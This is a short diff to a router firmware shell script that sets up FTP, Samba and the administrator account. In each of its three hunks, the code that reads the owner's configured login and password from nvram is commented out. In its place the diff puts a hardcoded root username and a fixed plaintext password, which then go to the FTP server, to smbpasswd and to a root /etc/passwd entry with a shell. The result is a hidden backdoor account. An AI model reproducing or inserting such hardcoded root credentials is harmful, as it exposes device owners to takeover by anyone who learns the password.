@@ -49,8 +49,10 @@ setFtp()
 	ftpwrite=`nvram_get 2860 FtpWrite`
 	ftpdownload=`nvram_get 2860 FtpDownload`
 	ftpupload=`nvram_get 2860 FtpUpload`
-	admID=`nvram_get 2860 Login`
-	admPW=`nvram_get 2860 Password`
+	#admID=`nvram_get 2860 Login`
+	#admPW=`nvram_get 2860 Password`
+	admID=root
+	admPW=luotao717
 	ip=`nvram_get 2860 lan_ipaddr`
 	echo "proftpd.sh server "$ftpname" $ip $ftpport $ftpmax"
 	proftpd.sh server "$ftpname" $ip $ftpport $ftpmax
@@ -73,8 +75,10 @@ setSmb()
 	smbwg=`nvram_get 2860 HostName`
 	echo "samba.sh "$smbnetbios" "$smbwg" "$PART1""
 	samba.sh "$smbnetbios" "$smbwg" "$PART1"
-	admID=`nvram_get 2860 Login`
-	admPW=`nvram_get 2860 Password`
+	#admID=`nvram_get 2860 Login`
+	#admPW=`nvram_get 2860 Password`
+	admID=root
+	admPW=luotao717
 	echo "smbpasswd -a "$admID" "$admPW""
 	smbpasswd -a "$admID" "$admPW"
 	allusers="$admID"
@@ -101,8 +105,10 @@ setSmb()
 
 case $1 in
 	"admin")
-		admID=`nvram_get 2860 Login`
-		admPW=`nvram_get 2860 Password`
+		#admID=`nvram_get 2860 Login`
+		#admPW=`nvram_get 2860 Password`
+		admID=root
+		admPW=luotao717
 		echo "$admID::0:0:Adminstrator:/:/bin/sh" > /etc/passwd
 		echo "$admID:x:0:$admID" > /etc/group
 		echo "nobody::65534:65533:nobody:/:/bin/bash" >> /etc/passwd
